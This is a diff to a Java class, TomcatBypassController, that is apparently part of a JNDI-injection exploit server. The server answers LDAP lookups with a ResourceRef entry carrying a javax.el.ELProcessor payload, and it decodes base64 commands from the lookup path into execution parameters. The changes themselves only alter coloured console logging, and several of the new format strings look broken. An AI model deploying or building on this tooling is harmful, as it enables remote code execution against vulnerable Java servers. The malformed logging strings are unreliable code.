@@ -73,7 +73,7 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+]|@ Sending LDAP ResourceRef result for" + base + "  with javax.el.ELProcessor payload"));
+            System.out.println(ansi().render("@|green [+]|@ Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
             System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String");
@@ -134,7 +134,7 @@ public class TomcatBypassController implements LdapController {
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+]|@ PaylaodType : " + payloadType));
+                System.out.println(ansi().render("@|green [+]@ PaylaodType : |" + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -150,7 +150,7 @@ public class TomcatBypassController implements LdapController {
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+]|@ Command : " + cmd));
+                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                 params = new String[]{cmd};
             }
 
@@ -159,7 +159,7 @@ public class TomcatBypassController implements LdapController {
                 byte[]   decodedBytes = java.util.Base64.getDecoder().decode(cmd1);
                 String   cmd          = new String(decodedBytes);
                 String[] cmdArray     = cmd.split(" ");
-                System.out.println(ansi().render("@|green [+]|@ Command : " + cmd));
+                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                 params = cmdArray;
             }
 
